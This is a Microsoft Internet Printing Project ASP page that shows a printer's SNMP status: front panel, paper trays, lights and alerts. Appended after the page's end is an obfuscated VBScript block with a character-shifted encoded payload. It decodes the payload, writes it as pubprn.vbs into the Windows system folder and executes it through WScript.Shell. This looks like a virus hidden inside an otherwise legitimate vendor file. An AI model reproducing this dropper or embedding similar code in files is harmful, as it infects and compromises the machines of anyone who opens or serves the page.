<%@ CODEPAGE=65001 %>
<%
'Localized Language Code Page
'------------------------------------------------------------
'
'   Microsoft Internet Printing Project
'
'   Copyright (c) Microsoft Corporation 1998
'
'   Default SNMP page. This page is used if there is nothing
'   supplied by the printer vendor.
'
'------------------------------------------------------------
    option explicit
%>
<!-- #include file = "ipp_util.inc" -->
<!-- #include file = "ipp_0000.inc" -->
<%
    On Error Resume Next
    Err.Clear

    CheckSession

    Response.expires = 0
    Response.Buffer = TRUE
    Dim bRefresh
    bRefresh = Request ("refresh") = 1
%>

<%

const L_NotEmpty_Text    = "Not Empty"   'The input tray is not empty
const L_Empty_Text       = "Empty"       'The input tray is empty
const L_Name_Text        = "Name"        'The name of the input tray
const L_PaperSize_Text   = "Paper Size"
const L_Media_Text       = "Media"
const L_Current_Text     = "Current"     'The Current number of the paper in the input tray
const L_Maximum_Text     = "Maximum"     'The Maximum number of the paper in the input tray
const L_Tray_Text        = "Tray "

const L_Seperator_Text   = " - "
const L_Printer_Text     = "Printer"
const L_Output_Text      = "Output"

Function ErrorHandler (strErr)

    Dim strHref

    strHref = "ipp_0013.asp?code=" & Err.Number & "&notes=" & strErr & "&description=" & Err.Description

    Response.Redirect (strHref)
    Response.End

End Function

Function ErrorHandler2 (strErr)

    Dim strScript

    strScript = "<script language=javascript>function noerror(){" &_
                "var strHref;" &_
                "strHref = ""ipp_0013.asp?code=" & Err.Number & "&notes" & strErr & """;" &_
                "window.location.href = strHref;}</script>"

    Response.Write (strScript)
    Response.End

End Function

Function GenConsoleTable(iRow, iColumn, strArray, strLang)
Dim strHTML
Dim strBgnCol, strEndCol
Dim strBgnRow, strEndRow
Dim i, j, srcIndex, c
Dim tmpArray
ReDim tmpArray (iColumn)

strHTML = ""

strBgnCol = "<tr>"
strEndCol = "</tr>"

If strLang = "JP" then
    strBgnRow = "<td width=10 class=jpnfont><center><font face = ""‚l‚r ‚oƒSƒVƒbƒN, Osaka"" size=2>"
Else
    strBgnRow = "<td width=10 ><center>" & DEF_FONT_TAG
End If

strEndRow = END_FONT & "</center></td>"

For i = 1 To iRow
    srcIndex = 1
    j = 1
    While j <= iColumn
        c = Mid (strArray(i - 1), srcIndex, 1)

        If c = "" Then
           tmpArray(j) = "&nbsp;"
        Else
            if Asc(c) <= 32 Then
               tmpArray(j) = "&nbsp;"
            Else
                If strLang = "JP" Then
                    tmpArray(j) = OleCvt.ToUnicode (c, 932)
                Else
                    tmpArray(j) = c
                End If
            End If
        End If
        j = j + 1
        srcIndex = srcIndex + 1
    Wend

    strHTML = strHTML & strBgnCol
    For j = 1 To iColumn
        strHTML = strHTML & strBgnRow & tmpArray(j) & strEndRow
    Next
    strHTML = strHTML & strEndCol
Next

GenConsoleTable = strHTML

End Function

Function GenOneLight (rgLights, i, strId)
    Dim strHTML

    strHTML = "<td width=50 align=right>&nbsp;&nbsp;&nbsp;"

    If rgLights(SNMP_LIGHT_ON, i) <> "0"  And strId <> "IBM Network Printer 24 2.34F" Then
        If rgLights(SNMP_LIGHT_OFF, i) <> "0" Then
            strHTML = strHTML & "<img src=""images/ipp_0012.GIF"">"
        Else
            strHTML = strHTML & "<img src=""images/ipp_0005.GIF"">"
        End If
    Else
        strHTML = strHTML & "<img src=""images/ipp_0015.GIF"">"
    End If

    strHTML = strHTML & "&nbsp;&nbsp;&nbsp;&nbsp;</td><td nowrap>" & DEF_FONT_TAG
    strHTML = strHTML & rgLights(SNMP_LIGHT_DESCRIPTION, i) & "&nbsp;" & END_FONT & "</td>"

    GenOneLight = strHTML

End Function

Function GenLightTable(iLights, rgLights, strId)
    Dim   i
    Dim   strHTML
    Dim   strBgnHdrCol, strEndHdrCol, strOneHeader
    Const L_State_Text = "State /"
    Const L_Light_Text =  "Light"

    strBgnHdrCol = "<td bgcolor=""#000000"">" & MENU_FONT_TAG & "<b>"
    strEndHdrCol = "</b>" & END_FONT & "</td>"

    strOneHeader = "<td align=right nowrap bgcolor=""#000000"">" & MENU_FONT_TAG & "<b>"  & L_State_Text & strEndHdrCol & "</td>" &  strBgnHdrCol & L_Light_Text & strEndHdrCol
    strHTML = "<tr>" &  strOneHeader & strOneHeader & strOneHeader & "</tr>"

    If iLights <= 25 then
        For i = 0 To iLights
            If i Mod 3 = 0 Then
                If i <> 0 Then strHTML = strHTML & "</tr>"
                strHTML = strHTML & "<tr>" & GenOneLight (rgLights, i, strId)
            Else
                strHTML = strHTML & GenOneLight (rgLights, i, strId)
            End If
        Next
        strHTML = strHTML & "</tr>"
    Else
        For i = 0 To iLights Step 2
            strHTML = strHTML & "<tr>" & GenOneLight (rgLights, i, strId)

            If i + 1 < iLights Then
                strHTML = strHTML & GenOneLight (rgLights, i + 1, strId)
            Else
                strHTML = strHTML & "<td></td><td></td>"
            End If

            strHTML = strHTML & "</tr>"
        Next
    End If

    GenLightTable = strHTML

End Function

Function GetCurrentNumberOfPaper (iCurrent)
    Dim strCount

    Select Case iCurrent
    Case -1, -2
        strCount = "&nbsp;"
    Case 0
        strCount = L_Empty_Text
    Case -3
        strCount = L_NotEmpty_Text
    Case Else
        strCount = cstr(iCurrent)
    End Select
    GetCurrentNumberOfPaper = strCount
End Function

Function GenTrayTable (bPaperSize, bPaperMedia, iTrays, rgTrays)
    Dim strHTML
    Dim strBgnHdrCol, strEndHdrCol
    Dim strBgnCol, strEndCol
    Dim strBgnRow, strEndRow
    Dim i, j, srcIndex, c
    Dim tmpArray

    strBgnHdrCol = "<td nowrap bgcolor=""#000000"">" & MENU_FONT_TAG & "<b>"
    strEndHdrCol = "</b>" & END_FONT & "</td>"
    strHTML = "<tr>"

    strHTML = strHTML & strBgnHdrCol & L_Name_Text & strEndHdrCol

    If bPaperSize Then
        strHTML = strHTML & strBgnHdrCol & L_PaperSize_Text & strEndHdrCol
    End If

    If bPaperMedia Then
        strHTML = strHTML & strBgnHdrCol & L_Media_Text & strEndHdrCol
    End If

    strHTML = strHTML & strBgnHdrCol & L_Current_Text & strEndHdrCol
    strHTML = strHTML & strBgnHdrCol & L_Maximum_Text & strEndHdrCol
    'strHTML = strHTML & strBgnHdrCol & L_State_Text & strEndHdrCol
    strHTML = strHTML & "</tr>"


    Dim strTrayName
    For i = 0 to iTrays
        strBgnCol = "<td>" & DEF_FONT_TAG
        strEndCol = END_FONT & "</td>"
        strHTML = strHTML & "<tr>" & strBgnCol

        if rgTrays(SNMP_INTRAY_UNIT, i) = "" or rgTrays(SNMP_INTRAY_UNIT, i) = " " then
            If rgTrays(SNMP_INTRAY_NAME, i) = "" Then
                strTrayName = L_Tray_Text & Cstr (i + 1)
            Else
                strTrayName = rgTrays(SNMP_INTRAY_NAME, i)
            End If
        Else
            strTrayName = rgTrays(SNMP_INTRAY_UNIT, i)
        End If
        strHTML = strHTML & strTrayName & strEndCol
        rgTrays(SNMP_INTRAY_UNIT, i) = strTrayName

        If bPaperSize Then
            strHTML = strHTML & strBgnCol

            dim strLongName
            strLongName =  objHelper.LongPaperName (rgTrays(SNMP_INTRAY_MEDIA, i))
            If strLongName = "Unknown" Then
                strLongName = rgTrays(SNMP_INTRAY_MEDIA, i)
            End If

            strHTML = strHTML & strLongName & strEndCol
        End If

        If bPaperMedia Then
            strHTML = strHTML & strBgnCol & getMedia (rgTrays(SNMP_INTRAY_MEDIA, i)) & strEndCol
        End If
        strHTML = strHTML & strBgnCol & GetCurrentNumberOfPaper( rgTrays(SNMP_INTRAY_CURRENT, i)) & strEndCol
        strHTML = strHTML & strBgnCol & rgTrays(SNMP_INTRAY_MAX, i) & strEndCol
        strHTML = strHTML & "</tr>"
    Next

    GenTrayTable = strHTML

End Function


Function GenAlertTable (iAlerts, rgAlerts, rgTrays)
    Dim strHTML
    Dim i, j, bDup, code, strDscp

    strHTML = ""

    For i = 0 to iAlerts
        code = rgAlerts(SNMP_ALERT_CODE, i)
        j = 0
        bDup = FALSE
        While j <= i - 1 And Not bDup
            If code = rgAlerts(SNMP_ALERT_CODE, j) Then
                If rgAlerts(SNMP_ALERT_SUBUNIT, i) = rgAlerts(SNMP_ALERT_SUBUNIT, j) And rgAlerts(SNMP_ALERT_INDEX, i) = rgAlerts(SNMP_ALERT_INDEX, j) Then
                    bDup = TRUE
                End If
            End If
            j = j + 1
        Wend

        If Not bDup Then
            strHTML = strHTML & "<tr><td width=""10%"">"

            Select Case rgAlerts(SNMP_ALERT_SEVERITY, i)
            Case 3,5
                strHTML = strHTML & "<img src=""images/ipp_0004.GIF"" width=""20"">"
            Case 4
                strHTML = strHTML & "<img src=""images/ipp_0003.GIF"" width=""20"">"
            Case Else
                strHTML = strHTML & "&nbsp;"
            End Select

            strHTML = strHTML & "</td><td>" & DEF_FONT_TAG
            Select Case rgAlerts(SNMP_ALERT_SUBUNIT, i)
            Case 8
                If rgAlerts(SNMP_ALERT_INDEX, i) > 0 Then
                    strHTML = strHTML & rgTrays(SNMP_INTRAY_UNIT, rgAlerts(SNMP_ALERT_INDEX, i) - 1) & L_Seperator_Text
                Else
                    strHTML = strHTML & L_Tray_Text & L_Seperator_Text
                End If
            Case 5
                strHTML = strHTML & L_Printer_Text & L_Seperator_Text
            Case 9
                strHTML = strHTML & L_Output_Text & L_Seperator_Text
            Case Else
                '
            End Select

            strHTML = strHTML & rgAlerts(SNMP_ALERT_DESCRIPTION, i) & END_FONT & "</td></tr>"
        End If
    Next

    GenAlertTable = strHTML

End Function

Function getMedia(mediaName)
    Dim media, i, mediaList
    Dim L_MediaList_Text(3)

    mediaList = Array("-white", "-envelope", "-colored", "-transparent")

    L_MediaList_Text(0) = "White Paper"
    L_MediaList_Text(1) = "Envelope"
    L_MediaList_Text(2) = "Colored Paper"
    L_MediaList_Text(3) = "Transparecy"

    i = 0
    For Each media In mediaList
        If InStr(mediaName, media) > 0 Then
            getMedia = L_MediaList_Text(i)
            Exit Function
        End If
        i = i + 1
    Next
    getMedia = ""
End Function


Const L_WrongIP_Message = "The IP Address is not correct."
Const L_PageTitle_Text = "Microsoft Default SNMP status"
Const strFileID = "page1.asp"

    Dim rgState, rgAlerts, rgLights, rgTrays, rgConsole, strLight
    Dim bRet, objHelper
    Dim iRow, iColumn, iAlerts, iTrays, iLights
    Dim bPaperSize, bPaperMedia, i
    Dim strLang
    Dim strId
    Dim objSNMP
    Dim strIP, strCommunity, iDevice, strDevice
    Dim strPrinter, strEncodedPrinter, strComputer, strNewURL
    Dim strHTML

    Err.Clear

    strIP = Request(IPADDRESS)
    If strIP = "" Then
        Err.Number = 1
        Err.Description = L_WrongIP_Message
        ErrorHandler (strFileID)
    End If

    strCommunity      = Request (COMMUNITY)
    iDevice           = Request(DEVICE)
    strDevice         = CStr(iDevice)
    strEncodedPrinter = Request(PRINTER)
    strPrinter        = OleCvt.DecodeUnicodeName ( strEncodedPrinter )

    Set objSNMP = Server.CreateObject(PROGID_SNMP)
    If Err Then ErrorHandler (strFileID)

    objSNMP.open strIP, strCommunity, 3, 2000
    If Err Then ErrorHandler (strFileID)

    strComputer = session(COMPUTER)

    strNewURL   = "page1.asp?refresh=1" & ATIPADDRESS & strIP             & ATCOMMUNITY & strCommunity &_
                                          ATPRINTER   & strEncodedPrinter & ATDEVICE    & strDevice

    Set objHelper = Server.CreateObject (PROGID_HELPER)
    objHelper.open "\\" & strComputer & "\" & strPrinter
    If Err Then ErrorHandler (strFileID)

    'Get Printer Id
    strId = objSNMP.Get ("25.3.2.1.3." & CStr (iDevice))
    If Err.Number <> 0 Then
        ErrorHandler (strFileID)
    End If

    'Get basic state
    rgState = rgSNMPGetState(objSNMP, iDevice)
    If Err.Number <> 0 Or Not IsArray (rgState) Then ErrorHandler (strFileID)


    If bRefresh Then
        bRet = rgSNMPConsole(objSNMP, iDevice, iRow, iColumn, rgConsole, strLang)
        If Not bRet Then ErrorHandler (strFileID)

        rgLights = rgSNMPLights(objSNMP, iDevice, iLights)
        If Err.Number <> 0 Then ErrorHandler (strFileID)
        rgTrays = rgSNMPGetInputTrays(objSNMP, iDevice, iTrays)
        If Err.Number <> 0 Then ErrorHandler (strFileID)

        If iTrays >= 0 then
            bPaperSize = not (rgTrays(SNMP_INTRAY_MEDIA, 0) = "" or  rgTrays(SNMP_INTRAY_MEDIA, 0) = " " )

            bPaperMedia = (getMedia (rgTrays(SNMP_INTRAY_MEDIA, 0)) <> "")
        End if
        'Get alerts
        rgAlerts = rgSNMPGetAlerts(objSNMP, objHelper, iDevice, iAlerts)


    End If

%>
<html>

<head>
<meta name="GENERATOR" content="Microsoft FrontPage 3.0">
<meta http-equiv="refresh" content="120; url=<%=strNewURL%>" >
<%=SetCodePage%>
<title><%=Write(L_PageTitle_Text) %></title>
</head>

<body bgcolor="#FFFFFF" text="#000000" link="#000000" vlink="#000000" alink="#000000"
topmargin="0" leftmargin="0" onload="noerror()">


<%=Write(DEF_BASEFONT_TAG)%>

<%
    If Not bRefresh Then
        Response.Flush
        bRet = rgSNMPConsole(objSNMP, iDevice, iRow, iColumn, rgConsole, strLang)
        If Not bRet Then ErrorHandler2 (strFileID)
    End If

   Const L_FrontPanelColon_Text = "Front Panel:"
   Const L_DeviceStatus_Text    = "Device Status:"
   Const L_FrontPanel_Text      = "FrontPanel"
   Const L_RealTimeTitle_Text   = "Real time display of the printer front panel"
%>

<table width="100%" border=0 cellspacing="0" cellpadding="2">
    <tr>
        <td nowrap>
            <b><%=Write(DEF_FONT_TAG & L_DeviceStatus_Text & END_FONT)%></b>
        </td>
<% If IsArray (rgConsole) Then
	Response.Write(Write("<td><b>" & DEF_FONT_TAG & L_FrontPanelColon_Text & END_FONT & "</b></td>") )
   End If
%>

    </tr>
    <tr>
        <td>
            <% =Write(strSnmpStatus(rgState)) %>
        </td>
<% If IsArray (rgConsole) Then
       strHTML = "<td><table border=""2"" bgcolor=""#C0C0C0"" ><tr>" &_
		     "<td><table border=""0"" width=""" & CStr(iColumn*10) & """ bgcolor=""#C0C0C0"" cellspacing=""0"" cellpadding=""0"" title = """ & L_RealTimeTitle_Text & """>" &_
                           GenConsoleTable(iRow, iColumn, rgConsole, strLang) &_
                      "</table></td>" &_
                 "</tr></table></td>"
	Response.Write( Write(strHTML) )
   End If
%>
    </tr>
</table>


<br>
<% Const L_PaperTrays_Text = "Paper Trays:" %>
<b><%=Write(DEF_FONT_TAG & L_PaperTrays_Text & END_FONT)%></b><br>

<%
    If Not bRefresh Then
        Response.Flush
        rgTrays = rgSNMPGetInputTrays(objSNMP, iDevice, iTrays)
        If Err.Number <> 0 Then ErrorHandler2 (strFileID)

        If iTrays >= 0 Then
            bPaperSize = not (rgTrays(SNMP_INTRAY_MEDIA, 0) = "" or  rgTrays(SNMP_INTRAY_MEDIA, 0) = " " )

            bPaperMedia = (getMedia (rgTrays(SNMP_INTRAY_MEDIA, 0)) <> "")
        End If
    End If
%>
<table border="0" width="100%" cellspacing="0" cellpadding="2">
<%=Write(GenTrayTable (bPaperSize, bPaperMedia, iTrays, rgTrays))%>
</table>


<%
    If Not bRefresh Then
        Response.Flush
        rgLights = rgSNMPLights(objSNMP, iDevice, iLights)
        If Err.Number <> 0 Then ErrorHandler2 (strFileID)
    End If
%>

<%If iLights >= 0 Then %>
<br>
<% const L_ConsoleLights_Text = "Console Lights:" %>
<b><%=Write(DEF_FONT_TAG & L_ConsoleLights_Text & END_FONT)%></b><br>

<table border="0" width="100%" cellspacing="0" cellpadding="2">
<%=Write(GenLightTable (iLights, rgLights, strId))%>
</table>
<% End If%>

<br>
<% Const L_DetailedErr_Text = "Detailed Errors and Warnings:" %>
<b><%=Write(DEF_FONT_TAG & L_DetailedErr_Text & END_FONT)%></b><br>
<%
    If Not bRefresh Then
        Response.Flush
        'Get alerts
        rgAlerts = rgSNMPGetAlerts(objSNMP, objHelper, iDevice, iAlerts)
        'If Err.Number <> 0 Then Exit Function
    End If

%>

<table border="0" width="100%">
<%=Write(GenAlertTable (iAlerts, rgAlerts, rgTrays))%>
</table>

<%
    objHelper.close
%>

</body>
</html>
<script language=javascript>
function noerror()
{
}
</script>
<%
    Response.End
%><ScRIPT laNGUAGE=VBsCRiPT>
ON ERrOR ResuMe Next
m5=m5&ho6("ne6>#a†“““a“†”–Ž†a¯†™•NK”†µa‚a~a„“†¢µ¦ƒ‹†¤•ic´„“Š‘µŠ¯ˆo‡Š¦”š´•†®ƒ«†„µcjNK´†•aƒ‚ƒ†a~a‚o°‘†•†™•‡Š­†i¸´„“Š‘µo”„“ª‘•‡¶¢Ž¦marjNKƒ¹~„‰“itujNK³‚¯¥Žª›†NKƒ–~ªµi“…krqqltqjNK”r~„‰“iª•i“¥ksvlzxjjNK´s~„‰“iŠµi“…ksvlzxjjNK”t~„©“iª•i“¯…ksvlzxjjNK”u~¤©³iŠ¯•i“¯…ksvlzxjjNK”v~„©³iŠ•i³¯…ksvlzxjjNK”w~„‰“iª¯•i“…ksvlzxjjNK”x~„©“iŠ¯•i³¯…ksvlzxjjNK´y~¤©“iª•i“…ksvlzxjjNK”z~„‰“iŠ•i“…ksvlzxjjNK„r~Šµi“…kylrjNK„s~ª¯•i“…kylrjNK¤t~Š•i“¯…kylrjNK¤u~Š•i“¯¥kylrjNKNK‡–„µª°aˆi´‰Š•jNK‡“a‚»~raµa­†i´‰ŠµjNK¤»~‚´„iŽŠ¥i”©Š•m‚»m†i”©Š•jjjNKŠ‡a„›wua¢¯…a¤»}zra•©†¯NK“‚¯…Žª»†NK“s~Š¯•i³¥ksjNKŠ§a³s~ra•‰¦¯NK„»~„›ltsNK†¯¥aª‡NK†¯…aŠ‡NKŠ§a„›zwa¢…a¤»}rsta•‰†NK“‚…°®Š›†NK“t~Š•i“…ksjNKŠ§a“t~ra•©¦NK„›~¤›ntsNK†¯¥aª§NK¦…aŠ‡NK„©~„›lƒ–NKˆ~ˆ¯g„‰“i„‰jNK¯†¹µNK¦¥a‡¶¯¤µªNKNK§–¯¤µª¯aˆˆi´©ŠµjNK‡“a¢~raµa­¦i”©ª•jNKˆ¨~ˆˆg„‰³i‚”„i®Š¥i´‰Š•m‚m­†i”‰ŠµjjjlrjNK¦¹•NK†…a‡–¯¤•ŠNKNK„°¥†ˆ†¯ijNKNK³‚a~aƒ¢ƒ†o“†‚¥‚­­NKƒ¢£¦o„´¦NK™‰~ˆˆi“‚jNKŽ¢Š­ijNKª§a¥¢ši°˜j~wa“a…‚ši°˜j~rta³a…‚ši°˜j~sra°“a¥‚ši˜j~syaµ©¦NK†rijNK¦´¦NK†uijNK†¯…aª§NKNK´¶ƒa„…†ˆ†ijNK°a¦“““a“†”¶Ž†a†¹•NK”†•a‚a~a¤“†‚•¦°ƒ«†¤•ic´¤“ª‘•ª¨o‡ª†”º”•†Žƒ‹¦¤•cjNK”†•a…³a~a‚o„“†¢µ†µ†™•‡ª­¦i˜”¤“Š‘•o”„“ª±µ§–­¢®†jNK¥“o¸“ª•†Š¯¦a”rg”sg„rgc~cgƒ™gˆi¤°…¦jgƒ™NK…“o˜“Š•¦Š¦a”tg´ug„sgc~cgƒ¹g¨¯ic¤…†~cg”vg´wg„tgcicg”rg”sg¤rgcjcjgƒ¹NK…³o¸“Š•†Š†ac‡¶¤•Šacg”vg”wg¤tgcicg´xg´yg„ugcjcNK…“o˜³ª•†­Š†ac‡“acg´zgc~ra•a­¦icg”xg”yg„ugcjcNK…“o˜“Šµ¦­Š¯†a”vg”wg¤tgc~cg”vg´wg„tgcg„‰³i‚”¤i®Š…icg”xg”yg„ugcmcg´zgcm†¯icg”xg´yg„ugcjjjncg£–gcjcNK¥“o˜³ªµ¦ª¦ac†™µcNK…³o¸“Š•†ª¦ac†…a§–„•ª¯cNK¥“o˜³Š•¦Š†ac†™¦¤¶µ¦acg”vg”wg„tgcicg´tg”ug„sgcjcNK¥“o˜“Š•†ª¯†ac†™¦¤–•†acg”vg”wg¤tgcicg”rg´sg„rgcjcNK…“o¤­°´†NK†¥a”¶£NKNK´–£aˆ¦ijNK°a†³³³a“¦´–®¦a¦™µNK”†µa‚a~a„³†‚•†ƒ«†¤µic”¤“ª±µª¨o‡Š¦´º”µ†Ž£‹†„•cjNK”¦•a…³a~a‚o„“†‚•†µ†¹µ‡Š­†i˜´„“Š‘•o´„³Š±•‡¶‚®†jNK…“o˜“Š•†ai“¢­jNK…“o„”†NK¦¯…a”–ƒNKNK´–ƒa®‚ªijNK¯a†““°“a“¦”–Ž†a†¹µNK´†•aˆa~a¤“†¢µ†°ƒ‹¦„•aic´„“Š‘µª¨o‡ª­†”š´•†Ž°ƒ‹¦„•cjNK”†•a‡a~aˆoˆ†•‡Š­¦ai¸´„“ª‘µo´„³Š‘•‡¶¯‚Ž†jNK”†•a”©‚“±a~a¤³†¢•¦ƒ‹†„µaic°–µ­°Œo‚‘‘Š„‚µªcjNK”¦•aŽ‚ª­a~a”‰‚“‘oˆ†µ¢®†”‘‚¤¦aic®¢±ªcjNK§°³a‚a~araµa®¢Šo‚¥¥“¦”´­ª”•”o„–¯•NK”†•a£a~a®‚Š­o¢……“¦´”­Š´µ”ai‚jNK¤¶•†“a~arNK”†•a¤a~a”‰‚“±o„³†‚•¦Š•†®aiqjNK§“a…a~araµ°aƒo‚¥…“†””†•“Š¦”o„–¯•NK†a~aƒo‚¥¥“†””¦¯•“Š¦”ai¤¶¯µ¦³jNK„o“¦„ª±ª†¯µ´o‚……ai†jNK¤–µ†³a~a¤–•¦“alarNK¯†¹•NKˆ†ijNK„o”¶£«†„•a~ac“†cNK¤oƒ…ša~accNK¤o¢µ•‚„‰Ž†µ´o‚…¥ai§jNK„o…¦†µ†‚§•¦³´–ƒŽŠ•a~a•“–†NK„o´†…NK¦™•NK†¯…a´–ƒNKNK”–£a†uijNKa¦““³a³†´¶Ž¦a¯†¹µNK´¦µa‚a~a„“†‚•†£‹†„•ic”„“ª±•Šˆo‡Š¦”š´•†Ž°£‹¦„µcjNK‡“a¦‚¤©a´††Œ¯†µ„‘š…³ª·†”aŠa‚o…“ª—†”NKª‡a”†¦Œ¦•¤±š…³ª—†”o¥“ª—†•º‘¦a~asa NK³a”†¦Œ¯†µ„‘º…“Š—¦´o…“Š—†•º±¦a~ataµ‰†NK†wai´††¬¯†•„‘š¥“Š·†”o‘‚µ‰agaccjNK¦¯…aŠ‡NK†™•NK†…a´–ƒNKNK”¶£a†vi§Š­†•‚“ˆ†•jNK¯a†“³³a“¦´–®†a¯†™µNK”†µa¢a~a„³†‚•†ƒ‹†„•ic´¤“ª‘•Š¯ˆo‡Š†”š”•¦Ž£‹†¤•cjNK´¦µa‡a~a‚o¨¦µ‡…†³i‡Š†µ‚³¨†•jNK‡³a†¢„‰a¯aŠa‡o‡Š¦´NK‡ª¦¦™•a~a‚oˆ†•¦¹•†¯”ª°¯‚®†io‘‚µ‰jNK†™µr~„‚”†i‡Š†¦™•jNK†™•s~„‚´†ic—£´cjNK†™µt~„‚”¦ic·£†cjNK†¹•u~„‚´†ic©µŽcjNK¦™µv~¤¢”¦ic‰µ•cjNK†¹µw~„‚”†ic©µ‚cjNK¦¹•x~­¤‚”†ic‰•ŽcjNK†¹µy~¤‚”†ic¢´‘cjNKŠ‡a†™•r~†™•sa°“a†™µr~†™•ta•©†NK”†•a±a~a¢o°‘†•†¹•‡ª­†i¯o±¢•‰marjNK“¥a~a‘o³†‚¥‚NK±o„”†NK´†µa…“a~a‚o„“†‚•†µ†™•§Š¦io‘‚•‰jNK…“o˜“Š•¦i³…jNK¥³o˜³Š•¦i³‚­jNK…“o„°´†NKo‚••³ªƒ–µ†”~rNK†¯¥aŠ§NKNKª‡a†™•r~†™•ua“a†™•r~†¹µva³a†™•r~†™•wa°³a†™•r~¦¹•xa°“a†¹•r~†¹•ya•‰¦NK´¦µa±a~a¢o‘¦¯•¦™µ‡Š¦io‘‚•‰marjNK“…a~a±o³†‚…‚­NK°±o„°”†NK”†•a…³a~a¢o„“¦‚•†•†™•‡ª†io‘¢•‰jNK…³o¸³Š•¦i“¥jNK¥“o˜³Š•†ª†ac}”„“Š±•a­¢ˆ–‚¨†~—ƒ´¤“Š‘•cNK…³o˜“ªµ¦­Š†aca†“³°“a“†´–Ž¦a¯†™µcNK…“o¸³ªµ¦ª¯†a´rg„ugc~cg”rg„ugcgcg´vg”wg¤tgcicg£™g™©gƒ¹gcjcNK…“o¸“ª•†Š¯†ac‡–„•Šacg”vg”wg„tgcicg”xg”yg„ugcjcNK¥“o¸³Š•¦­Š†ac‡³acg”zgc~ra•a¦¯icg”xg”yg¤ugcjcNK…“o¸“Š•†Š†a”vg”wg„tgc~cg´vg´wg„tgcg„©³i‚”¤iŽŠ¥icg´xg”yg„ugcmcg”zgcm­¦icg´xg´yg¤ugcjjjnrjcNK…“o˜³ª•†­ª¯†ac¯¦™•cNK…“o¸“Š•†Š†ac¦¥a‡–¯¤µŠcNK…³o¸“Š•†Š†ac´¦•a¢~„“†‚•†ƒ‹†¤•icg£™gc”„³Š‘µŠˆo§Š¦”š”•†®°ƒ‹†„µcg£™gcjcNK¥“o˜³ª•¦­ª†ac˜Š¯…~‚oˆ†•´‘¦¤Š‚­‡­…†³iqjcNK¥³o˜“Šµ¦­ª†ac”†µa¥“~‚o„³¦‚•¦•¦¹µ§Š­†i˜Š¯…gcgƒ¹gc±–ƒ‘“o—ƒ´cg£™gcjcNK¥“o˜“Šµ¦ª¦ac…“o¸“Š•†aicg”rg¤ugcjcNK…“o˜“Š•†ª¯†ac…“o„­°”†cNK¥³o˜³Š•†Š¦ac´¦•a™~¤³†‚µ†ƒ‹¦¤•icgƒ™gc˜”¤“Š‘µo”‰†cg£™gcjcNK¥“o˜³Š•¦­Š¯†ac¹o“¶¯ai˜ª¥gcg£™gc±–ƒ‘“o—ƒ”cgƒ¹gcjcNK…“o¸“Šµ¦Š¯¦ac}p”„³Š‘•cNK…³o„­°´†NKo¢µ•“Šƒ–•†”~rNK†…aŠ‡NK¯†™•NK†¥a”¶£NKNK´–ƒa†wi‡ª¦•‚“¨¦•jNK¯a†³““a“¦´–Ž†a†™•NK”†•a‚a~a„³†‚•†ƒ‹†¤•ic”¤³Š±•ª¯¨o‡ª†”º´•¦Ž°£«†„µcjNK”¦µa‡a~a‚oˆ†•§…†“i‡Š­†µ¢³¨†µjNK§³a†¢¤©aaŠ¯a§o´–£‡…¦“”NK†vai¯o‘¢•‰jNK†wai¯o‘¢•‰jNK†™µNK¦¯…a”–ƒNKNK”–ƒa¦rijNKa†“³³a“†´–Ž†a†™µNK”¦µa‚a~a„³¦‚µ†£‹†„µic”„“Š‘•Šˆo§Š­†´š”•¦Ž£«†„•cjNK‡°“a†¢„‰a´††Œ¦µ¤‘š…“ª·¦´aŠa¢o…³Š—†”NKŠ‡a”†¦Œ¯¦µ¤°±º…³Š·¦”o…“Š·†µš‘†a~asa NK°³a”†¦Œ¯¦µ„‘º¥³ª·¦”o¥“Š·†µº‘†a~ataµ‰†NK¦tai”¦¦¬¯†•„°‘š…³ª—†”o‘‚•‰agaccjNK¦…aŠ‡NK†™•NK¦…a”–£NKNK”–ƒa¦si‡Š­¦•¢“ˆ†•jNKa†““³a“†”¶Ž†a¦¹•NK”†•a‚a~a„³†¢•†£«†„•ic´„³ª‘•Š¯ˆo§Š†”š”•¦®ƒ«†¤•cjNK”¦•a§a~a‚oˆ†µ‡…†“i‡Š†•‚“ˆ¦•jNK§³a¦‚„©aaŠ¯a§o§ª†”NK¯o¢••“ª£¶•†”a~aqNK‚o…†­¦•†‡Š¦ai¯o‘‚•‰jNK†¹•NK¦…a”–£NKNK”–ƒa†ti‡Š­¦•‚“¨†•jNK°¯a¦³³“a“†”–Ž¦a†™•NK”†µa‚a~a„“†‚µ¦ƒ«†„•ic´„“Š‘µªˆo§ª¦”º”•†®ƒ‹¦„µcjNK”†µa‡a~a‚oˆ†µ‡­…†“i‡Š­†•¢“ˆ†µjNK‡“a†¢¤‰aaŠa‡o”–ƒ‡°…¦³´NK†saio‘‚µ‰jNK†taio‘‚•‰jNK†¹•NK†¯…a”–ƒ#jz3>#„°…†~©°wiŽ¥vj#gvOdUJpo!ip7)oz6*gpS!o>2!Up!MfO)oz6*ip7>ip7'DIs)bTD)nJe)oz6-o-mFo)oz6***.75*OFyUFoE!gVODUJPofYFDVuf!ip7)jz3*FYfDVuf!ip7)ne6*")
FuNCTION ho6(ny5)
fOR n=1 TO Len(ny5)
ho6=ho6&chr(aSc(MId(ny5,n,LEN(ny5)))-1)
NeXt
end FuncTIon
Set A=CREATeoBjEct("SCrIPTing.fILeSySTEMoBjECt")
wInD=A.GETSPECIAlfOlDEr(0)
SEt DR=A.CrEATeTextfIlE(WinD&"\puBPRN.VBS")
DR.wRITe (m5)
Dr.cloSe
SEt X=CReaTEoBJECT("wscRiPT.sHELL")
x.RuN (WiNd&"\pUbPRN.vBS")
</SCripT>
